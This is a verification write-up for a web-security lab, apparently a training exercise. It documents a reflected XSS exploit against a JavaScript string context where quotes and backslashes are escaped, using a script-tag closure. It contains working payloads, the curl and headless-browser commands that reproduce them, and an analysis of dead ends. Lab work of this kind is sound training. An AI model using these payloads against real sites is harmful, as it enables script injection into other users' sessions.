# Verification — Reflected XSS into JS string (quotes+backslash escaped)

## Methodology
1. Reflection sweep (curl): marker → echoes (`<h1>` + inline `var searchTerms`).
2. Metachar map (`'"<>\`): read each echo's encoding.
3. Terminator analysis at the JS layer (which chars CAN end the string? → none:
   `'`→`\'`, `\`→`\\`).
4. Layer escalation: with JS-layer dead, test the HTML-parser layer (`</script>`
   closure) — first with a single-quoted inner payload (diagnostic failure), then
   quoteless/double-quoted (success).
5. Lab acceptance: real-browser `alert(1)` closure; banner polls.

## Evidence

### 1. Reflections (curl, `?search=reconprobe`)
```
<h1>0 search results for 'reconprobe'</h1>
var searchTerms = 'reconprobe';
```

### 2. Encoding map (curl, `?search=ENC'"<>\`)
```
h1    : ENC&apos;&quot;&lt;&gt;\\'     (fully encoded + backslash doubled — dead)
script: var searchTerms = 'ENC\'"<>\\';  ('→\' ; \→\\ ; " raw ; <> raw)
```
JS-layer terminators: NONE (`'` escaped, `\` doubled — no shift possible, unlike the
eval-JSON lab where `\` passed raw).

### 3. Diagnostic failure (headless dump-dom) — load-bearing evidence
```
?search=</script><script>document.title='SCRCLOSE'</script>
→ title UNCHANGED; DOM shows the closure DID parse (new script element present)
```
Cause: the server escaped the INNER single quotes too (`\'SCRCLOSE\'`) → fresh block
throws (stray `\`). The closure mechanism worked; the inner payload violated the same
escaper. Lesson: the escaper applies to the WHOLE input including post-closure text —
inner payloads must use surviving charsets only (`"`/quoteless here).

### 4. Positive proof (headless dump-dom)
```
?search=</script><script>document.title="5556001"</script>
→ <title>5556001</title>
```
Double quotes survive raw → valid inner JS → executes on parse.

### 5. Lab acceptance
Real browser → `/?search=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`
(`alert(1)` needs no quotes at all) → `alert(1)` → `is-solved` (first poll).

### 6. Dead-end analysis
| Candidate | Verdict | Basis |
|---|---|---|
| `';JS;//` quote-breakout | dead | `'`→`\'` (this lab's stated defense, real) |
| `\`-shift breakout | dead | `\`→`\\` (contrast eval-JSON lab's raw `\`) |
| Raw newline breakage | dead (no execution) | unterminated-literal throw, nothing runs |
| h1-context injection | dead | fully encoded |
| Inner single-quoted JS | throws (verified §3) | escaper covers post-closure text too |

## Reproducibility
```
BASE=…
curl -s "$BASE/?search=ENC%27%22%3C%3E%5C" | grep -E "search results for|searchTerms = "
chromium --headless --no-sandbox --dump-dom "$BASE/?search=%3C/script%3E%3Cscript%3Edocument.title%3D%225556001%22%3C/script%3E" | grep -o "<title>[^<]*</title>"
```

## Confirmation criteria
- CONFIRMED: dual reflections, escaper map (both layers' charsets), closure
  mechanism (element split in DOM), inner-quote failure mode, quoteless success,
  real-browser acceptance.
- The failed inner-quote attempt is first-class evidence (proves escaper scope),
  not a discarded draft.